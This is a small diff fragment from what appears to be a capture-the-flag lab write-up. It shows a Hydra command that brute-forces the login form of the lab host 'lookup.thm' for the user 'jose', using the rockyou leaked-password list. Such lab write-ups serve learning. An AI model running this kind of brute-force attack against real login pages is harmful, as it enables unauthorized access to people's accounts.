@@ -15,6 +15,7 @@ Results:
 ```
 
 As we can see, Jose was also found, so I ran the password check:
+
 ```hydra -l jose -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"```
 
 And we find:
